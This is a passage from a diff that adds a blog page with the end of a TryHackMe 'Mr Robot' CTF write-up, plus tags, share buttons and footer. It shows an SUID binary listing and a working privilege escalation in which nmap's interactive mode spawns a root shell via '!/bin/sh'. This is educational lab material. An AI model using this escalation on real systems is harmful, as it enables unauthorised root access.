+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/local/bin/nmap
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+</span></span><span style="display:flex;"><span>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
+</span></span></code></pre></div><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
+<p>After checking <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a> for <code>nmap</code> SUID escalations, we see that we can invoke interactive mode to easily achieve our objective.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/$ /usr/local/bin/nmap --interactive
+</span></span><span style="display:flex;"><span>/usr/local/bin/nmap --interactive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting nmap V. 3.81 <span style="color:#f92672">(</span> http://www.insecure.org/nmap/ <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#66d9ef">for</span> help
+</span></span><span style="display:flex;"><span>nmap&gt; !/bin/sh
+</span></span><span style="display:flex;"><span>!/bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># </span>
+</span></span></code></pre></div><p>et voila!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://robscharf.github.io/tags/blog/">blog</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/tryhackme/">tryhackme</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/gobuster/">gobuster</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/nmap/">nmap</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/wordpress/">wordpress</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/tags/php/">php</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://robscharf.github.io/categories/ctf/">ctf</a></span>
+        <span class="tag"><a href="https://robscharf.github.io/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        999 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-05-02 17:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up&amp;caption=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up&amp;canonicalUrl=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up&amp;body=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f&amp;media=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f;description=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f&amp;title=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up&amp;summary=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up&amp;source=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f&amp;resubmit=true&amp;title=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f;title=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up%20https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f&amp;t=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20Mr%20Robot%20CTF%20-%20Write%20Up&amp;url=https%3a%2f%2frobscharf.github.io%2fposts%2f2022%2f05%2fthm-mr-robot-ctf-write-up%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://robscharf.github.io/posts/2022/05/how-to-add-a-backtick-hotkey-to-windows-10/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">How to: Add a backtick hotkey to Windows 10</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities-write-up/">
+                    <span class="button__text">THM: Upload Vulnerabilities - Write Up</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <a href="https://robscharf.github.io//colophon">&#9829;</a>
+            
+        </div>
+    </div>
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://robscharf.github.io/bundle.min.2d3d449fc0ff117f00ac91342a8f76cd5b710411d7a0254dbe75da3234d2f685d6a0c44cff60c414e90b6a149da8e4032c713c25e4e6838e2e3918dc0ad2e81c.js" integrity="sha512-LT1En8D/EX8ArJE0Ko92zVtxBBHXoCVNvnXaMjTS9oXWoMRM/2DEFOkLahSdqOQDLHE8JeTmg44uORjcCtLoHA=="></script>
+
+
+
+    </body>
+</html>
